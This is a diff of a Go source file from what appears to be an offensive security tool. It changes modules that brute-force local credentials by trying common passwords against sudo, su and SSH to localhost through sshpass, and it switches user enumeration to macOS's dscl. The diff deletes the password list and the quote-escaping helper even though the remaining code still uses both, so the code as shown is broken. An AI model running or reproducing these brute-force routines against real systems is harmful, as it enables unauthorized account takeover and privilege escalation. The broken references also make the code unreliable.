@@ -5,23 +5,11 @@ import (
 	"strings"
 )
 
-// ---------------------------------------------------------------------------
-// Brute force — local password guessing
-// ---------------------------------------------------------------------------
-
-var commonPasswords = []string{
-	"password", "admin", "root", "123456", "12345678",
-	"qwerty", "letmein", "welcome", "Passw0rd!", "toor",
-	"test", "1234", "12345", "123456789", "1234567890",
-	"passwd", "iloveyou", "abc123", "password123", "P@ssw0rd",
-}
-
 // RunBruteSudo attempts common passwords against sudo.
 func RunBruteSudo(_ map[string]interface{}) (string, error) {
 	var results []string
 	results = append(results, "=== SUDO BRUTE FORCE ===")
 
-	// Check passwordless sudo first
 	sudoOut, err := run("sudo -n true 2>&1")
 	if err == nil {
 		_ = sudoOut
@@ -57,9 +45,8 @@ func RunBruteSSH(_ map[string]interface{}) (string, error) {
 	var results []string
 	results = append(results, "=== SSH BRUTE FORCE ===")
 
-	// Collect local users (non-system)
-	usersOut, err := run("awk -F: '$3>=1000&&$3!=65534{print $1}' /etc/passwd 2>/dev/null")
-	if err != nil {
+	usersOut, err := run("dscl . list /Users 2>/dev/null | grep -v '^_' | head -20")
+	if err != nil || usersOut == "" {
 		usersOut = "root"
 	}
 	users := strings.Fields(usersOut)
@@ -67,7 +54,6 @@ func RunBruteSSH(_ map[string]interface{}) (string, error) {
 		users = []string{"root"}
 	}
 
-	// Check if sshpass or ssh binary exist
 	hasSSHPass := false
 	checkOut, _ := run("which sshpass 2>/dev/null")
 	if strings.TrimSpace(checkOut) != "" {
@@ -86,13 +72,12 @@ func RunBruteSSH(_ map[string]interface{}) (string, error) {
 			cmd := fmt.Sprintf("ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no %s@localhost 'echo AUTH_OK' 2>/dev/null", user)
 			out, err := run(cmd)
 			if err == nil && strings.Contains(out, "AUTH_OK") {
-				results = append(results, fmt.Sprintf("[+] %s@localhost: key-based auth works (no password)", user))
+				results = append(results, fmt.Sprintf("[+] %s@localhost: key-based auth works", user))
 			}
 		}
 		return strings.Join(results, "\n"), nil
 	}
 
-	// Try common passwords for each user via sshpass
 	for _, user := range users {
 		for _, pw := range commonPasswords[:10] {
 			cmd := fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 %s@localhost 'echo AUTH_OK' 2>/dev/null", escapeSQ(pw), user)
@@ -107,13 +92,13 @@ func RunBruteSSH(_ map[string]interface{}) (string, error) {
 	return strings.Join(results, "\n"), nil
 }
 
-// RunBruteLocal attempts common passwords against local user accounts via su.
+// RunBruteLocal attempts common passwords via su.
 func RunBruteLocal(_ map[string]interface{}) (string, error) {
 	var results []string
 	results = append(results, "=== LOCAL PASSWORD BRUTE FORCE ===")
 
-	usersOut, err := run("awk -F: '$3>=1000&&$3!=65534{print $1}' /etc/passwd 2>/dev/null")
-	if err != nil {
+	usersOut, err := run("dscl . list /Users 2>/dev/null | grep -v '^_' | head -20")
+	if err != nil || usersOut == "" {
 		usersOut = "root"
 	}
 	users := strings.Fields(usersOut)
@@ -161,9 +146,4 @@ func RunBruteAll(_ map[string]interface{}) (string, error) {
 		}
 	}
 	return strings.Join(parts, "\n\n"), nil
-}
-
-// escapeSQ escapes single quotes for shell commands.
-func escapeSQ(s string) string {
-	return strings.ReplaceAll(s, "'", "'\\''")
 }
